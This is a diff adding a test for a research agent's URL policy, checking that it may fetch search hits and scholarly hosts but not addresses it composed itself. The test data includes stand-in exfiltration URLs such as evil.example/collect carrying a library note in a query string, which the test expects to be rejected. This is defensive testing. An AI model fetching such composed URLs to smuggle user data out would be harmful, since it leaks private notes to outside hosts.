@@ -106,6 +106,39 @@ describe("research.start", () => {
     expect(notices).toEqual([expect.stringContaining("inbox"), expect.stringContaining("reason")]);
   });
 
+  it("lets the agent open scholarly hosts and search hits, and nothing it composed itself", async () => {
+    const { h, jobs } = await setup();
+    const topic = [
+      "Thema",
+      "@fake search retrieval practice => https://example.org/paper/a https://example.net/b",
+      "@fake fetch https://example.org/paper/a",
+      "@fake fetch https://doi.org/10.1000/x",
+      // Text on a fetched page may name any address; only search hits count.
+      "@fake fetch https://evil.example/collect?d=Notiz-der-Bibliothek",
+      "@fake fetch https://example.org/paper/a?d=Notiz-der-Bibliothek",
+      add("https://evil.example/?d=Notiz", { why: "passt" }),
+      add("10.1000/ok", { why: "passt" }),
+    ].join("\n");
+    await h.registry.call(
+      researchStart.name,
+      { actor: "human" },
+      { prompt: topic, backend: "fake", maxItems: 5 },
+    );
+    await jobs.done();
+    const session = h.service.list({ kind: "research", limit: 1 })[0];
+    const entries = h.service.get(session?.id ?? "").entries;
+    const said = entries
+      .filter((e) => e.type === "assistant")
+      .map((e) => (e as { text: string }).text)
+      .join("\n");
+    expect(said).toContain("Search allowed.");
+    expect(said).toContain("Fetch allowed: https://example.org/paper/a\n");
+    expect(said).toContain("Fetch allowed: https://doi.org/10.1000/x");
+    expect(said).toContain("Fetch rejected: https://evil.example/collect?d=Notiz-der-Bibliothek");
+    expect(said).toContain("Fetch rejected: https://example.org/paper/a?d=Notiz-der-Bibliothek");
+    expect(h.inbox.map((i) => i.identifier)).toEqual(["10.1000/ok"]);
+  });
+
   it("fails the job with the agent's error and its fix", async () => {
     const h = await createHarness({ backend: fakeBackend({ FAKE_ACP_AUTH: "1" }) });
     open.push(h);
